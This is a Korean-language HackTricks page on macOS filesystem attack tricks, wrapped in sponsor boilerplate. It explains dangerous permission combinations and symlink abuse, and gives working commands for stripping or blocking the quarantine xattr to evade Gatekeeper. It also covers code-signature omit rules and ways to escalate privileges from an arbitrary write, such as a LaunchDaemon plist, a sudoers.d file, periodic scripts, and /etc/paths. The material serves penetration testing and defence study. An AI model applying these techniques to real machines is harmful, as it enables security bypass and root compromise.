# macOS FS 트릭

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되기를 원하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## POSIX 권한 조합

**디렉토리**의 권한:

* **읽기** - 디렉토리 항목을 **열거**할 수 있습니다.
* **쓰기** - 디렉토리에 **파일을 삭제/작성**할 수 있으며 **빈 폴더를 삭제**할 수 있습니다.&#x20;
* 그러나 쓰기 권한이 없으면 **비어 있지 않은 폴더를 삭제/수정**할 수 없습니다.
* 소유하지 않은 경우 **폴더의 이름을 수정**할 수 없습니다.
* **실행** - 디렉토리를 **탐색**할 수 있습니다. 이 권한이 없으면 해당 디렉토리 내의 파일이나 하위 디렉토리에 액세스할 수 없습니다.

### 위험한 조합

**root가 소유한 파일/폴더를 덮어쓰는 방법**, 하지만:

* 경로에서 하나의 상위 **디렉토리 소유자**가 사용자인 경우
* 경로에서 하나의 상위 **디렉토리 소유자**가 **쓰기 권한이 있는 사용자 그룹**인 경우
* 사용자 **그룹**이 **파일에 쓰기** 권한을 가지고 있는 경우

이전 조합 중 하나로 공격자는 특권 있는 임의의 쓰기를 얻기 위해 예상된 경로에 **sym/hard 링크**를 삽입할 수 있습니다.

### 폴더 루트 R+X 특수 케이스

**루트만 R+X 액세스**를 가진 **디렉토리**에 파일이 있는 경우, 다른 사람은 해당 파일에 액세스할 수 없습니다. 따라서 사용자가 읽을 수 없는 파일을 이 폴더에서 **다른 폴더로 이동**시킬 수 있는 취약점을 통해 이러한 파일을 읽을 수 있습니다.

예시: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## 심볼릭 링크 / 하드 링크

특권 있는 프로세스가 **하위 권한이 있는 사용자**에 의해 **제어**될 수 있는 **파일**에 데이터를 작성하는 경우, 사용자는 심볼릭 또는 하드 링크를 통해 해당 파일을 다른 파일로 **가리킬 수 있으며**, 특권 있는 프로세스는 해당 파일에 작성합니다.

특권 상승을 위해 임의의 쓰기를 악용할 수 있는 공격자가 어디에서 악용할 수 있는지 다른 섹션에서 확인하세요.

## .fileloc

**`.fileloc`** 확장자를 가진 파일은 다른 애플리케이션 또는 이진 파일을 가리킬 수 있으므로 해당 파일을 열면 해당 애플리케이션/이진 파일이 실행됩니다.\
예시:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 임의의 FD

**프로세스가 높은 권한으로 파일이나 폴더를 열 수 있다면**, `crontab`을 악용하여 `/etc/sudoers.d`에 있는 파일을 **`EDITOR=exploit.py`**로 열어 `exploit.py`가 `/etc/sudoers` 내부의 파일에 대한 FD를 얻고 악용할 수 있습니다.

예를 들어: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## 검역 xattrs 트릭 회피

### 제거하기
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable 플래그

만약 파일/폴더에 이 불변 속성이 있다면, 그 위에 xattr을 넣을 수 없습니다.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs 마운트

**devfs** 마운트는 **xattr을 지원하지 않습니다**, 자세한 정보는 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)에서 확인할 수 있습니다.
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

이 ACL은 파일에 `xattrs`를 추가하는 것을 방지합니다.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** 파일 형식은 ACE(액세스 제어 항목)를 포함하여 파일을 복사합니다.

[**소스 코드**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)에서는 **`com.apple.acl.text`**라는 xattr에 저장된 ACL 텍스트 표현이 압축 해제된 파일에 ACL로 설정됩니다. 따라서, ACL이 다른 xattr에 쓰여지지 않도록 막는 ACL이 있는 AppleDouble 파일 형식으로 애플리케이션을 zip 파일로 압축한 경우... 격리 xattr이 애플리케이션에 설정되지 않았습니다:

자세한 정보는 [**원본 보고서**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)를 확인하세요.

이를 복제하기 위해 먼저 올바른 acl 문자열을 얻어야 합니다:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(이 작업이 작동하는 경우에도 샌드박스는 quarantine xattr을 먼저 작성합니다.)

필요하지는 않지만 그냥 그대로 두겠습니다:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## 코드 서명 우회

번들에는 **`_CodeSignature/CodeResources`** 파일이 포함되어 있으며 번들의 **각 파일**의 **해시**가 포함되어 있습니다. CodeResources의 해시는 또한 **실행 파일에 포함**되어 있으므로 해당 부분을 수정할 수 없습니다.

그러나 일부 파일의 서명은 확인되지 않을 것입니다. 이러한 파일은 plist에 omit 키가 있는 경우입니다.
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
다음 명령을 사용하여 리소스의 서명을 CLI에서 계산할 수 있습니다:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## DMG 마운트

사용자는 기존 폴더 위에도 사용자 정의 DMG를 마운트할 수 있습니다. 다음은 사용자 정의 내용이 포함된 사용자 정의 DMG 패키지를 생성하는 방법입니다:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## 임의의 쓰기

### 주기적인 sh 스크립트

스크립트가 **쉘 스크립트**로 해석될 수 있다면 매일 트리거되는 **`/etc/periodic/daily/999.local`** 쉘 스크립트를 덮어쓸 수 있습니다.

다음과 같이 이 스크립트의 실행을 **가짜로** 만들 수 있습니다: **`sudo periodic daily`**

### 데몬

임의의 **LaunchDaemon**인 **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**를 작성하고 임의의 스크립트를 실행하는 plist를 실행합니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
`/Applications/Scripts/privesc.sh` 스크립트를 생성하여 루트로 실행하고자 하는 **명령어**를 작성하세요.

### Sudoers 파일

**임의의 쓰기 권한**이 있다면, **`/etc/sudoers.d/`** 폴더 내에 자신에게 **sudo** 권한을 부여하는 파일을 생성할 수 있습니다.

### PATH 파일

**`/etc/paths`** 파일은 PATH 환경 변수를 채우는 주요 위치 중 하나입니다. 이 파일을 덮어쓰려면 루트 권한이 필요하지만, **특권 프로세스**에서 **전체 경로 없이 명령어를 실행**하는 스크립트가 있다면 이 파일을 수정하여 **해킹**할 수 있습니다.

&#x20;또한 **`/etc/paths.d`**에 파일을 작성하여 `PATH` 환경 변수에 새로운 폴더를 로드할 수 있습니다.

## 참고 자료

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>
